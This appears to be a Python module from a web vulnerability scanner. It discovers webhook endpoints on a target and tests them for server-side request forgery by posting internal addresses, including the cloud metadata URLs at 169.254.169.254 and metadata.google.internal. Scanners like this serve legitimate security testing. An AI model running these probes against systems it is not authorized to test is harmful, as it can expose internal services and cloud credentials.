#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Webhook SSRF Module
Webhook endpoint discovery, SSRF via webhook, signature forgery.
"""
from config import Colors
from modules.base import BaseModule


class WebhookSSRFModule(BaseModule):
    """Webhook SSRF detection module."""

    name = "Webhook SSRF"
    vuln_type = "webhook_ssrf"

    WEBHOOK_PATHS = [
        "/webhook", "/webhooks", "/api/webhook", "/api/webhooks",
        "/hook", "/hooks", "/callback", "/callbacks", "/notify",
        "/api/notify", "/api/callback", "/event", "/events",
        "/api/events", "/integration", "/integrations",
    ]

    def test_url(self, url):
        self._test_webhook_discovery(url)

    def test(self, url, method, param, value):
        pass

    def _test_webhook_discovery(self, url):
        """Discover webhook endpoints and test for SSRF."""
        from urllib.parse import urlparse, urljoin
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in self.WEBHOOK_PATHS:
            try:
                webhook_url = base + path
                resp = self.requester.request(webhook_url, "GET", timeout=5)
                if resp and resp.status_code in (200, 201, 405):
                    self.engine.add_finding(self._finding(
                        technique="Webhook Endpoint",
                        url=webhook_url,
                        severity="INFO",
                        confidence=0.5,
                        param=path,
                        payload=webhook_url,
                        evidence=f"Webhook endpoint found: {path} (status {resp.status_code})",
                    ))
                    # Test SSRF via webhook
                    self._test_webhook_ssrf(webhook_url)
            except Exception:
                pass

    def _test_webhook_ssrf(self, webhook_url):
        """Test if webhook accepts internal URLs."""
        ssrf_targets = [
            "http://127.0.0.1", "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
        ]
        for target in ssrf_targets[:2]:
            try:
                data = {"url": target, "callback_url": target, "target": target, "webhook_url": target}
                resp = self.requester.request(webhook_url, "POST", data=data)
                if resp and resp.status_code in (200, 201, 202):
                    self.engine.add_finding(self._finding(
                        technique="Webhook SSRF",
                        url=webhook_url,
                        severity="HIGH",
                        confidence=0.4,
                        param="url",
                        payload=target,
                        evidence=f"Webhook accepted internal URL: {target}",
                    ))
            except Exception:
                pass

    def _finding(self, **kw):
        from core.engine import Finding
        return Finding(**kw)
